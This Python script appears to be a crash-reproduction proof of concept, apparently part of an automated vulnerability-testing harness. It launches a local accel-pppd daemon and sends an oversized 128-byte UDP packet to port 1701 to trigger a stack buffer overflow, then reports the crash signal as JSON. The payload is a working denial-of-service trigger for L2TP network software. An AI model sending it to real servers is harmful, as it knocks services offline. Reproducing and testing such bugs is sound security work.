#!/usr/bin/env python3
"""
PoC: Stack buffer overflow in accel-pppd via libtriton's process_packet.

Sends a UDP packet larger than 64 bytes to trigger a stack buffer overflow
in the process_packet() function inside libtriton.so, which uses rep movsb
without bounds checking, causing a SIGSEGV when the corrupted return address
is popped.
"""

import argparse
import json
import os
import signal
import socket
import subprocess
import sys
import tempfile
import time


def generate_config() -> str:
    """Generate a minimal accel-pppd configuration file."""
    return (
        "[modules]\n"
        "path=lib64/accel-ppp\n"
        "l2tp\n"
        "\n"
        "[core]\n"
        "log-error=/dev/stderr\n"
        "thread-count=1\n"
        "\n"
        "[ppp]\n"
        "verbose=1\n"
        "\n"
        "[l2tp]\n"
        "verbose=1\n"
    )


def build_payload() -> bytes:
    """
    Build a UDP payload large enough to overflow the 64-byte stack buffer
    in process_packet and corrupt the return address, causing SIGSEGV.

    The buffer in process_packet is 64 bytes (0x40). We send 128 bytes
    to reliably overwrite the saved RBP and return address.
    """
    return b"A" * 128


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PoC for accel-pppd stack buffer overflow"
    )
    parser.add_argument(
        "--binary", required=True, help="Path to the accel-pppd binary"
    )
    parser.add_argument(
        "--json-out",
        default=None,
        help="Write JSON result to file instead of stdout",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Per-run timeout in seconds (default: 10)",
    )
    args = parser.parse_args()

    binary_path = os.path.abspath(args.binary)
    binary_dir = os.path.dirname(binary_path)
    work_dir = os.path.abspath(os.path.join(binary_dir, ".."))

    # Determine the top-level directory that contains lib64/
    parent_dir = binary_dir
    lib64_path = os.path.join(parent_dir, "lib64")
    retries = 0
    while not os.path.isdir(lib64_path) and retries < 5:
        parent_dir = os.path.dirname(parent_dir)
        lib64_path = os.path.join(parent_dir, "lib64")
        retries += 1

    if os.path.isdir(lib64_path):
        launch_dir = parent_dir
    else:
        launch_dir = work_dir

    # Generate config file in a temp directory
    tmp_dir = tempfile.mkdtemp(prefix="accel_poc_")
    config_path = os.path.join(tmp_dir, "accel-ppp.conf")
    with open(config_path, "w") as f:
        f.write(generate_config())

    # Build the command
    cmd = [
        binary_path,
        "--no-sigsegv",
        "-c",
        config_path,
    ]

    # Set up environment
    env = os.environ.copy()
    lib_path = os.path.join(launch_dir, "lib64", "accel-ppp")
    if os.path.isdir(lib_path):
        existing = env.get("LD_LIBRARY_PATH", "")
        if existing:
            env["LD_LIBRARY_PATH"] = lib_path + ":" + existing
        else:
            env["LD_LIBRARY_PATH"] = lib_path

    # Build the payload
    payload = build_payload()

    result = {
        "binary": binary_path,
        "command": cmd,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": None,
        "stdout": "",
        "stderr": "",
        "observable": {
            "kind": "combined_output",
            "value": "",
            "path": None,
        },
        "error": None,
    }

    start_time = time.monotonic()

    try:
        # Start the daemon
        proc = subprocess.Popen(
            cmd,
            cwd=launch_dir,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
        )

        # Wait for the daemon to bind to the UDP port
        time.sleep(1.5)

        # Check if the process is still alive
        ret = proc.poll()
        if ret is not None:
            result["returncode"] = ret
            result["error"] = "Daemon exited before we could send the payload"
            stdout, stderr = proc.communicate()
            result["stdout"] = (stdout or b"").decode("utf-8", errors="replace")
            result["stderr"] = (stderr or b"").decode("utf-8", errors="replace")
            elapsed = time.monotonic() - start_time
            result["runtime_ms"] = int(elapsed * 1000)
            combined = result["stdout"] + "\n" + result["stderr"]
            result["observable"]["value"] = combined[:8192]
            emit_json(result, args.json_out)
            sys.exit(1)

        # Send the trigger payload via UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2.0)
        sock.sendto(payload, ("127.0.0.1", 1701))
        sock.close()

        # Wait for the daemon to crash
        try:
            stdout, stderr = proc.communicate(timeout=args.timeout)
            result["timed_out"] = False
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()
            result["timed_out"] = True

        elapsed = time.monotonic() - start_time
        result["runtime_ms"] = int(elapsed * 1000)
        result["returncode"] = proc.returncode
        result["stdout"] = (stdout or b"").decode("utf-8", errors="replace")
        result["stderr"] = (stderr or b"").decode("utf-8", errors="replace")

        # Determine signal information
        if proc.returncode is not None and proc.returncode < 0:
            sig_num = -proc.returncode
            try:
                result["signal"] = signal.Signals(sig_num).name
            except (ValueError, AttributeError):
                result["signal"] = f"SIGUNKNOWN({sig_num})"
        elif proc.returncode is not None and proc.returncode > 128:
            sig_num = proc.returncode - 128
            try:
                result["signal"] = signal.Signals(sig_num).name
            except (ValueError, AttributeError):
                result["signal"] = f"SIGUNKNOWN({sig_num})"
        else:
            result["signal"] = None

    except Exception as e:
        result["error"] = str(e)
        elapsed = time.monotonic() - start_time
        result["runtime_ms"] = int(elapsed * 1000)

    # Build observable
    combined = result["stdout"] + "\n" + result["stderr"]
    result["observable"]["value"] = combined[:8192]

    emit_json(result, args.json_out)


def emit_json(result: dict, json_out: str | None) -> None:
    """Emit the JSON result to stdout or a file."""
    output = json.dumps(result, indent=2)
    if json_out:
        os.makedirs(os.path.dirname(json_out) or ".", exist_ok=True)
        with open(json_out, "w") as f:
            f.write(output)
            f.write("\n")
    else:
        print(output)


if __name__ == "__main__":
    main()